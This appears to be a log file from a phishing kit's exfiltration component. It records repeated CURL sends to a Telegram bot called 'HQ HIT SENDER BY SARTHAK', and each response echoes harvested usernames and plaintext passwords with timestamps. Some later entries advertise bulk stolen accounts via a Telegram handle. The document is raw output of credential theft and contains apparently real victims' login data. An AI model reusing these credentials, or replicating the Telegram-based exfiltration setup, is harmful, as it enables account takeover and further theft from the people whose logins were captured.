+Response: {"ok":true,"result":{"message_id":10514,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842519,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:19 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:25 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10515,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842526,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:25 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:31 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10516,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842532,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:31 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:36 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10517,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842537,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:36 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:42 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10518,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842543,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:42 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:48 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10519,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842549,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:48 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:53 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10520,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842554,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:53 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:25:58 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10521,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842558,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:25:58 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:26:07 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10522,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842567,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:26:07 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:26:13 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10523,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842573,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:26:13 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:26:19 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10524,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842579,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:26:19 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:27:52 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10525,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842672,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:27:52 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:27:56 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10526,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842677,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:27:56 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:28:03 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10527,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842683,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:28:03 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:28:09 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10528,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842690,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:28:09 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:28:16 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10529,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842696,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:28:16 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:28:29 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10530,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842709,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:28:29 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:29:04 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10531,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787842745,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:29:04 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-27 20:33:50 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10532,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787843031,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-27 08:33:50 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-08-28 09:56:01 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10546,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1787891162,"text":"jerrys \u2705\nUsername: will0buy0all0stock\nPassword: Telegram@jagvir7\nDate/Time (IST): 2026-08-28 09:56:01 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-09-11 02:25:33 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10720,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1789073733,"text":"jerrys \u2705\nUsername: Foticent\nPassword: nageockA44$\nDate/Time (IST): 2026-09-11 02:25:33 AM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-09-15 12:55:21 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10803,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1789457122,"text":"jerrys \u2705\nUsername: Hueroloko\nPassword: 403014Jz\nDate/Time (IST): 2026-09-15 12:55:21 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-09-15 12:56:05 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10804,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1789457166,"text":"jerrys \u2705\nUsername: Hueroloko\nPassword: 403014Jz\nDate/Time (IST): 2026-09-15 12:56:05 PM","entities":[{"offset":0,"length":8,"type":"bold"}]}}
+Error: 
+
+2026-09-26 08:02:12 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10978,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790389932,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:02:12 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:02:33 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10979,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790389953,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:02:33 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:02:44 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10980,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790389965,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:02:44 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:03:31 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10981,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790390012,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:03:31 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:03:45 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10982,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790390025,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:03:45 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:03:53 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10983,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790390033,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:03:53 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:04:12 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10984,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790390053,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:04:12 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:04:27 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10985,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790390068,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:04:27 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
+2026-09-26 08:06:48 - Attempting to send to chat_id: 1272510733
+Method: CURL
+Response: {"ok":true,"result":{"message_id":10986,"from":{"id":7257814757,"is_bot":true,"first_name":"HQ HIT SENDER BY SARTHAK","username":"senderbyther_bot"},"chat":{"id":1272510733,"first_name":"S","username":"ersarthak03","type":"private"},"date":1790390209,"text":"jerrys \u2705\nUsername: Need bulk accounts\nPassword: please contact tg @jagvir7\nDate/Time (IST): 2026-09-26 08:06:48 AM","entities":[{"offset":0,"length":8,"type":"bold"},{"offset":66,"length":8,"type":"mention"}]}}
+Error: 
+
